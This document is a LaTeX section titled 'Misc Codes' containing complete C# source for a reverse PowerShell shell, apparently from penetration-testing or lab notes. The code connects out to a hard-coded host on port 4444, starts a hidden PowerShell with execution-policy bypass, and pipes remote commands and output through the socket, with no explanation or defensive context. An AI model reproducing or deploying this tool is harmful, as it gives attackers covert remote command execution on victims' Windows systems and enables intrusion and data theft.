\section{Misc Codes}

\subsection{Reverse Powershell}

\begin{verbatim}
using System;
using System.IO;
using System.Net.Sockets;
using System.Diagnostics;

namespace ReversePowerShell
{
    internal class ReversePowerShell
    {
        private static StreamWriter streamWriter; // Needs to be global so that HandleDataReceived() can access it

        static void Main(string[] args)
        {
            // Check for correct number of arguments
            //if (args.Length != 2)
            //{
            //    Console.WriteLine($"Usage: {Process.GetCurrentProcess().ProcessName} <IP> <Port>");
            //    return;
            //}

            try
            {
                // Connect to <IP> on <Port>/TCP
                TcpClient client = new TcpClient();
                //client.Connect(args[0], int.Parse(args[1]));
                client.Connect("10.10.16.2", 4444);

                // Set up input/output streams
                Stream stream = client.GetStream();
                StreamReader streamReader = new StreamReader(stream);
                streamWriter = new StreamWriter(stream);
                streamWriter.WriteLine("Hello");
                streamWriter.Flush();

                // Define a hidden PowerShell (-ep bypass -nologo) process with STDOUT/ERR/IN all redirected
                Process p = new Process();
                p.StartInfo.FileName = "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe";
                p.StartInfo.Arguments = "-ep bypass -nologo";
                p.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
                p.StartInfo.UseShellExecute = false;
                p.StartInfo.RedirectStandardOutput = true;
                p.StartInfo.RedirectStandardError = true;
                p.StartInfo.RedirectStandardInput = true;
                p.OutputDataReceived += new DataReceivedEventHandler(HandleDataReceived);
                p.ErrorDataReceived += new DataReceivedEventHandler(HandleDataReceived);

                // Start process and begin reading output
                p.Start();
                p.BeginOutputReadLine();
                p.BeginErrorReadLine();
 
                // Re-route user-input to STDIN of the PowerShell process
                // If we see the user sent "exit", we can stop
                string userInput = "";
                while (!userInput.Equals("exit"))
                {
                    userInput = streamReader.ReadLine();
                    p.StandardInput.WriteLine(userInput);
                }

                // Wait for PowerShell to exit (based on user-inputted exit), and close the process
                p.WaitForExit();
                client.Close();
            }
            catch (Exception) { }

        }

        private static void HandleDataReceived(object sender, DataReceivedEventArgs e)
        {
            if (e.Data != null)
            {
                streamWriter.WriteLine(e.Data);
                streamWriter.Flush();
            }
        }
    }
}
\end{verbatim}

